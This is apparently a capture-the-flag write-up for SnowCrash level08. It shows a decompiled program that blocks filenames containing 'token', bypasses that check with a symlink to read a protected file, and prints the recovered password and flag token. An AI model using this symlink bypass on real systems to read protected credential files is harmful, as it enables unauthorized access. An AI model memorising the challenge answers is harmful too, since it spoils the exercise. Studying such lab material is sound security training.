## Level08

Again, a `level08` exe and a `token` file without permission in it.

As we can see in the [level08_decomp.c](./level08_decomp.c) there are several checks for the args you pass to the program:

```c
int main()
{
	local_14 = *(int *)(in_GS_OFFSET + 0x14);
	if (argc == 1) {
		printf("%s [file to read]\n",*in_stack_00000008);
						// WARNING: Subroutine does not return
		exit(1);
	}
	pcVar1 = strstr((char *)in_stack_00000008[1],"token");
	if (pcVar1 != (char *)0x0) {
		printf("You may not access \'%s\'\n",in_stack_00000008[1]);
						// WARNING: Subroutine does not return
		exit(1);
	}
	__fd = open((char *)in_stack_00000008[1],0);
	if (__fd == -1) {
		err(1,"Unable to open %s",in_stack_00000008[1]);
	}
	__n = read(__fd,local_414,0x400);
	if (__n == 0xffffffff) {
		err(1,"Unable to read fd %d",__fd);
	}
	sVar2 = write(1,local_414,__n);
	if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
						// WARNING: Subroutine does not return
		__stack_chk_fail();
	}
	return sVar2;
}
```

We can pass the first test by giving it any argument, the second one indicates that giving `token` as an arguments exits and the other ones are just checks for the read and write calls.

So our objective is to somehow read the `token` file.

## Exploit

We can do so by creating a symlink to `token` and pass it to the program:

```bash
level08@SnowCrash:~$ ln -s ~/token /tmp/tt4
level08@SnowCrash:~$ ./level08 /tmp/tt4
quif5eloekouj29ke0vouxean
```

We can then su to the flag and get it:

```bash
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

## Token

25749xKZ8L7DkSCwJkT9dyv6f